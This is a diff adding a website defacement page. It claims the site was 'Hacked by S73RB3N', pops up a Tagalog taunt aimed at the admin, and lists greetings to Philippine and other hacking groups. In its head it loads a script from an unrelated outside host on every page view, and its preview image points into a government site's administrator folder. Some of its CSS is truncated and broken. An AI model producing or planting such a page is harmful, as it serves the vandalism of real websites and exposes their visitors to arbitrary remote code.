@@ -1,0 +1,310 @@
+
+<!DOCTYPE html>
+<!--
+Designed by Adickzz
+
+
+DefacePage HACKER Philippines #1
+-->
+<html>
+<head>
+    <title>Hacked by Me</title>
+    <link rel="SHORTCUT ICON" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/1024px-Anonymous_emblem.svg.png">
+    <meta name="Author" content="ZyberPH"/>
+    <meta name="copyright" content="Adickzz"/>
+    <meta name="description" content="Ohh Shit!!!Admin"/>
+    <meta name="keywords" content="Your Website Has Been Hacked"/>
+    <meta property="og:title" content="Hacked by Zak Mik Ael"/>
+    <meta property="og:image:width" content=" ">
+    <meta property="og:image:height" content=" ">
+    <meta property="og:image" content="http://dispendukcapil.surabaya.go.id/administrator/components/com_acepolls/assets/css/BackgroundDeface.png">
+    <link href='http://fonts.googleapis.com/css?family=Amatic SC' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Megrim' rel='stylesheet' type='text/css'>  
+    <link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+    <script type="text/javascript" src="http://rabbitsec.ga/jancok"></script>
+</head>
+<style type="text/css">
+    @import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
+    body {
+        background-image: url("http://www.suicidesquad.com/assets/images/home/background_plain.jpg");
+        background-repeat: no-repeat;
+        background-size: 100%;
+        background-position: top center;
+        overflow: hidden;
+        cursor: none;
+        margin: 0px;
+    }
+    svg {
+        width: 600px;
+        height: 100px;
+        display: block;
+        position: relative;
+        overflow: hidden;
+        margin: 0 auto;
+        background: transparent;
+    }
+    text {
+        filter: url(#filter);
+        fill: white;
+        font-family: 'Share Tech Mono', sans-serif;
+        font-size: 100px;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+    }
+#headM{
+	font-family:Orbitron;
+	position:fi
+	t:0px;
+	right:0px;
+	bottom:0px;
+	background:transpar
+	t-align:cen
+	title{
+	font-size:30px;
+	font-family:Abel;
+	font-weight:bold;
+	color:#ffffff;
+	text-shadow: 0px 0px 10px black;
+}
+.title span{
+	font-size:50px;
+	font-family:Abel;
+	font-weight:bold;
+	color:#ffffff;
+	text-shadow: 0px 0px 10px black;
+}
+.greets{
+	font-family: Abel;
+	color: black;
+}
+.footer{
+	font-family:Orbitron;
+	color:white;
+	font-size:10px;
+	text-shadow: 0px 0px 40px black;
+}
+</style>
+</head>
+<body>
+<center>
+<br>
+<script type="text/javascript">alert("PAK GANERN ANG WEBSITE MO");</script>
+<font face="Megrim" color="#cc00cc" size="7">Hacked By S73RB3N</font><font face="Microsoft Sans Serif" size="2" color="#FFFFFF">
+<br>
+<br>
+<img src="http://files.gamebanana.com/img/ico/sprays/joker_4.png" height="300" weight="600"></a><br>
+<font face="Megrim" size="6" color="#cc00cc"> Greetings:
+<br>
+ </font></center>
+ <center>
+
+<script> 
+
+TypingText = function(element, interval, cursor, finishedCallback) {
+
+if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+
+this.running = true; // Never run.
+
+return;
+
+}
+
+this.element = element;
+
+this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+
+this.interval = (typeof interval == "undefined" ? 100 : interval);
+
+this.origText = this.element.innerHTML;
+
+this.unparsedOrigText = this.origText;
+
+this.cursor = (cursor ? cursor : "");
+
+this.currentText = "";
+
+this.currentChar = 0;
+
+this.element.typingText = this;
+
+if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+
+TypingText.all.push(this);
+
+this.running = false;
+
+this.inTag = false;
+
+this.tagBuffer = "";
+
+this.inHTMLEntity = false;
+
+this.HTMLEntityBuffer = "";
+
+}
+
+TypingText.all = new Array();
+
+TypingText.currentIndex = 0;
+
+TypingText.runAll = function() {
+
+for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+
+}
+
+TypingText.prototype.run = function() {
+
+if(this.running) return;
+
+if(typeof this.origText == "undefined") {
+
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval); // We haven't finished loading yet. Have patience.
+
+return;
+
+}
+
+if(this.currentText == "") this.element.innerHTML = "";
+
+// this.origText = this.origText.replace(/<([^<])*>/, ""); // Strip HTML from text.
+
+if(this.currentChar < this.origText.length) {
+
+if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+
+this.tagBuffer = "<";
+
+this.inTag = true;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+
+this.tagBuffer += ">";
+
+this.inTag = false;
+
+this.currentText += this.tagBuffer;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.inTag) {
+
+this.tagBuffer += this.origText.charAt(this.currentChar);
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+
+this.HTMLEntityBuffer = "&";
+
+this.inHTMLEntity = true;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+
+this.HTMLEntityBuffer += ";";
+
+this.inHTMLEntity = false;
+
+this.currentText += this.HTMLEntityBuffer;
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else if(this.inHTMLEntity) {
+
+this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+
+this.currentChar++;
+
+this.run();
+
+return;
+
+} else {
+
+this.currentText += this.origText.charAt(this.currentChar);
+
+}
+
+this.element.innerHTML = this.currentText;
+
+this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+
+this.currentChar++;
+
+setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+
+} else {
+
+this.currentText = "";		
+
+this.currentChar = 0;
+
+this.running = false;
+
+this.finishedCallback();
+
+}
+
+}
+
+</script>
+<br>
+<font face="Megrim" color="#cc00cc" size="6" id="info">
+<br> NewbieXHacker, LeatherFace, N1ghTr@y, n3far1ous, K3nt, ./Bl4nK, Lilz, Lazy, PH R3D,<br>
+nemesis PH AnonGhost. Kurio'SH, EcrousPhkiller,
+Blood Security International,<br> Anonymous Philippines, Pinoy Hacking Community, C0d3x Cyber Army.
+Pinoy Vendetta, Str4what Pirates Philippine Hackers, Pinoy Hackers, Pakistan Hackers, Indonesia Hackers<br>, Pak Cyber Skull And You
+</font>
+<br>
+</font></p>
+
+<script type="text/javascript"> 
+
+//Define first typing example:
+
+//Define second typing example (use "slashing" cursor at the end):
+
+new TypingText(document.getElementById("info"), 70, function(i){
+
+var ar = new Array("/"," ","/","/"); return " " + ar[i.length %
+
+ar.length]; });
+
+//Type out examples:
+
+TypingText.runAll();
+</script>
+
+
+<center><font face="Amatic SC" size="4" color="#cc00cc"><embed src="http://picosong.com/t4WN" autostart="true" 
+
+loop="true"
+width="2" height="0">
+</embed>
+</html>
